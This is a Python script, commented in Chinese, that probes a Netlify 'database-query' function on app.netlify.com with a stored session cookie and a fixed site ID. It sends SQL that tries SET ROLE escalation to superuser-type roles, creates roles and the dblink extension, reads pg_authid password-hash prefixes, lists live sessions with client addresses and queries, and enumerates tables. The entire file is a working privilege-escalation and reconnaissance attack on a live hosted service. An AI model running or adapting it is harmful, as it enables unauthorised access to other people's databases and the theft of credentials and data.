# -*- coding: utf-8 -*-
"""database-query 变异第五轮:SET ROLE 提权/权限确认/会话与表清单"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()

def req(body):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=30)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_A,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

def q(sql):
    return {'siteId': SITE_A, 'action': 'query', 'sql': sql}

def tx(queries):
    return {'siteId': SITE_A, 'action': 'transaction', 'queries': queries}

def show(label, body, trunc=350):
    try:
        s, raw = req(body)
        print('%-46s %d %s' % (label, s, raw[:trunc].decode('utf-8', 'ignore').replace('\n', ' ')))
    except Exception as e:
        print('%-46s ERR %s' % (label, str(e)[:60]))

# E1. 角色权限详情
show('owner role flags',  q('select rolname, rolsuper, rolinherit, rolcreaterole, rolcreatedb, rolcanlogin, rolbypassrls, rolconfig from pg_roles where rolname like %s' % "'netlify%'"))
# E2. SET ROLE 提权尝试(每个角色独立事务,失败不影响)
for r in ['neon_superuser', 'neon_service', 'cloud_admin', 'netlifydb_readonly', 'pg_signal_backend']:
    show('set role %s' % r, tx([{'sql': 'set role %s' % r}, {'sql': 'select current_user, session_user'}]))
# E3. 提权操作确认(权限边界)
show('create role x',     q('create role probe_x_%d' % __import__('time').time() if False else 'create role probe_zzz')),
show('create ext',        q('create extension if not exists dblink')),
show('read pg_authid',    q('select rolname from pg_authid')),
show('read pg_authid pw', q('select rolname, substr(rolpassword,1,10) from pg_authid limit 3')),
# E4. 会话与连接面
show('pg_stat_activity',  q("select usename, application_name, client_addr, state, query from pg_stat_activity where state is not null")),
show('pg_stat db',        q('select datname, numbackends from pg_stat_database')),
# E5. 表清单(找 Netlify 预置表)
show('all tables',        q("select table_schema, table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') order by 1,2")),
